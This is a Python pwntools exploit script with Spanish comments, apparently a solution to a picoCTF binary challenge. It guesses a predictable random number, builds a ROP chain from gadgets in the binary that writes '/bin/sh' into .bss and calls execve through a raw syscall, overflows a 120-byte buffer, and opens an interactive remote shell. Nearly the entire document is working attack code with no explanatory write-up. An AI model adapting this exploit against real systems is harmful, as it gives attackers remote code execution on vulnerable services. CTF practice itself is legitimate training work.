from pwn import *

context.binary = elf = ELF('./vuln')
target = remote('shape-facility.picoctf.net', 58421)

# 1. Ganar el juego (Aleatoriedad predecible)
target.recvuntil(b"What number would you like to guess?\n")
target.sendline(b"84")
target.recvuntil(b"Name? ")

# 2. Construir la cadena ROP MANUALMENTE (Bypass de SROP)
rop = ROP(elf)

# Extraemos los gadgets básicos del binario
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

# Buscamos gadgets más específicos usando ensamblador crudo
# (pwntools a veces ignora pop rdx si viene acompañado de otro registro)
pop_rdx_rbx = next(elf.search(asm('pop rdx ; pop rbx ; ret')))
mov_rdi_rsi = next(elf.search(asm('mov qword ptr [rdi], rsi ; ret')))

# Elegimos una dirección segura en la sección .bss para escribir "/bin/sh\x00"
bss_addr = elf.bss() + 16

# --- ARMAMOS LA CADENA ROP (Sin caracteres malos) ---

# A) Escribir el string "/bin/sh\x00" en la dirección segura (.bss)
rop.raw(pop_rdi)
rop.raw(bss_addr)
rop.raw(pop_rsi)
rop.raw(b'/bin/sh\x00')
rop.raw(mov_rdi_rsi)

# B) Configurar los registros para ejecutar syscall 59 (execve)
# rdi = Puntero a "/bin/sh"
rop.raw(pop_rdi)
rop.raw(bss_addr)

# rsi = 0 (NULL)
rop.raw(pop_rsi)
rop.raw(0)

# rdx = 0 (NULL). Usamos el gadget compuesto, así que pasamos dos ceros
rop.raw(pop_rdx_rbx)
rop.raw(0) # Para rdx
rop.raw(0) # Basura para rbx

# rax = 59 (Código para execve en Linux x64)
rop.raw(pop_rax)
rop.raw(59)

# ¡Disparar la llamada al sistema!
rop.raw(syscall)

# 3. Enviar el payload final
offset = 120
padding = b"A" * offset
payload = padding + rop.chain()

target.sendline(payload)
target.interactive()
